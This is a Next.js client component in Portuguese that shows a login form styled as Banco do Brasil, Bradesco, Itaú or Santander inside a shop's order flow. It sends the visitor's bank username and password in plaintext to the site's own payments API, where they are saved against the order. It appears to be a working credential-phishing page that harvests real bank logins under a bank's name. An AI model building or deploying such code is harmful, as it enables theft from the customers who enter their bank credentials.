"use client";

import { useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { toast } from "react-hot-toast";

export default function BankLoginClient({ bank }: { bank: string }) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const router = useRouter();
  const searchParams = useSearchParams();
  const orderId = searchParams.get("orderId");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      toast.error("Por favor, preencha todos os campos.");
      return;
    }

    if (!orderId) {
      toast.error("ID do pedido não encontrado.");
      return;
    }

    try {
      // Update the payment with bank login details
      const response = await fetch(`/api/payments/bank-login`, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          orderId,
          bankLogin: { username, password },
        }),
        credentials: "include",
      });

      const data = await response.json();
      if (response.ok) {
        toast.success("Login salvo com sucesso!");
        // Redirect to a confirmation page or back to "Meus Pedidos"
        router.push("/meus-pedidos");
      } else {
        toast.error(data.error || "Erro ao salvar login do banco.");
      }
    } catch (error) {
      console.error("Error saving bank login:", error);
      toast.error("Erro ao salvar login do banco.");
    }
  };

  // Map bank slugs to display names
  const bankNames: { [key: string]: string } = {
    "banco-do-brasil": "Banco do Brasil",
    bradesco: "Bradesco",
    itau: "Itaú",
    santander: "Santander",
  };

  return (
    <div className="min-h-screen bg-white">
      <main className="py-12">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-gray-800 mb-8 text-center">
            Login no {bankNames[bank] || "Banco"}
          </h1>
          <div className="bg-gray-50 p-6 rounded-lg shadow-md max-w-md mx-auto">
            <form onSubmit={handleSubmit}>
              <div className="mb-4">
                <label className="block text-gray-600 mb-2">Usuário</label>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full p-3 border rounded-lg"
                  placeholder="Seu usuário do banco"
                  required
                />
              </div>
              <div className="mb-4">
                <label className="block text-gray-600 mb-2">Senha</label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full p-3 border rounded-lg"
                  placeholder="Sua senha"
                  required
                />
              </div>
              <button
                type="submit"
                className="w-full bg-green-600 text-white p-3 rounded-lg hover:bg-green-700 transition-colors"
              >
                Entrar
              </button>
            </form>
          </div>
        </div>
      </main>
    </div>
  );
}